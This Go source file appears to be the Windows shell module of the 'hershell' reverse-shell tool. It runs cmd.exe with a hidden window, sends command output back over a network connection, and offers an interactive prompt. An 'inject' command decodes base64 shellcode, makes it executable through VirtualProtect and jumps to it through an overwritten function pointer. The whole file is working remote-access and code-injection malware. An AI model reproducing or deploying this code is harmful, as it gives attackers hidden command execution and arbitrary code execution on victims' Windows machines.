// +build windows !linux !darwin !freebsd

package shell

import (
	"bufio"
	"encoding/base64"
	"net"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

func GetShell() *exec.Cmd {
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

func ExecuteCmd(command string, conn net.Conn) {
	cmd_path := "C:\\Windows\\System32\\cmd.exe"
	cmd := exec.Command(cmd_path, "/c", command+"\n")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func InteractiveShell(conn net.Conn) {
	var exit bool = false
	scanner := bufio.NewScanner(conn)

	conn.Write([]byte("[hershell]>"))

	for scanner.Scan() {
		command := scanner.Text()
		if len(command) > 2 {
			argv := strings.Split(command, " ")
			switch argv[0] {
			case "inject":
				shellcode, err := base64.StdEncoding.DecodeString(argv[1])
				if err == nil {
					go ExecShellcode(shellcode)
				}
			case "exit":
				exit = true
				break
			default:
				ExecuteCmd(command, conn)
			}
			if exit {
				break
			}
		}
		conn.Write([]byte("[hershell]>"))
	}
}

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func ExecShellcode(shellcode []byte) {
	// Declare function pointer
	f := func() {}
	// Change permsissions on f function ptr
	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Call to VirtualProtect failed!")
	}

	// Override function ptr
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&shellcode))

	// Change permsissions on shellcode string data
	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&shellcode))), uintptr(len(shellcode)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}
	// Call the function ptr it
	f()
}
